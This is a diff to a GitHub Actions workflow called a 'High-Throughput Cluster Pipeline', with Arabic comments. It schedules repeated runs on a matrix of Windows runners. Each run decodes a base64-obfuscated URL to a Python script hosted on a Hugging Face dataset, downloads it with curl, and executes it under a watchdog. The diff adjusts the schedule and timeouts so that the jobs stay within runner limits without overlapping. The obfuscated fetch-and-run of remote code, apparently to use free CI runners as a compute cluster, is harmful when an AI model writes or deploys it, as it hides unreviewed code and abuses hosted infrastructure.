@@ -3,7 +3,8 @@ name: High-Throughput Cluster Pipeline
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 * * * *'
+    # تعديل زمن التكرار إلى كل ساعتين لمنع تداخل الجلسات
+    - cron: '0 */2 * * *'
 
 concurrency:
   group: cluster-pool-${{ github.workflow }}-${{ github.ref }}
@@ -13,7 +14,7 @@ jobs:
   dispatch-cluster:
     name: "Node-${{ matrix.machine_id }}"
     runs-on: windows-2022
-    timeout-minutes: 75
+    timeout-minutes: 55
 
     strategy:
       fail-fast: false
@@ -26,7 +27,6 @@ jobs:
         run: |
           echo "[BOOT] Initializing Node-${{ matrix.machine_id }} environment..."
           
-          # فك تشفير الرابط المصدر وتحميل ملف التشغيل
           DOWNLOAD_SRC=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9TcGVlZG8wby9saW5rL3Jlc29sdmUvbWFpbi9zdGFydF9zaHJpbmtfbmV3LnB5" | base64 --decode)
           
           curl -sL "$DOWNLOAD_SRC" -o app_runner.py
@@ -53,10 +53,11 @@ jobs:
           }
           $WorkerTask = Start-Process @InvocationConfig
           
-          Write-Host ">>> Watchdog actively monitoring. Timeout cap: 74 minutes."
+          # تقليل مهلة الانتظار إلى 45 دقيقة (2700 ثانية) لتنتهي المهمة بأمان قبل الدورة التالية
+          Write-Host ">>> Watchdog actively monitoring. Timeout cap: 45 minutes."
           
           try {
-              Wait-Process -InputObject $WorkerTask -Timeout 4440 -ErrorAction Stop
+              Wait-Process -InputObject $WorkerTask -Timeout 2700 -ErrorAction Stop
               Write-Host ">>> Workload completed within designated operational limit."
           }
           catch {
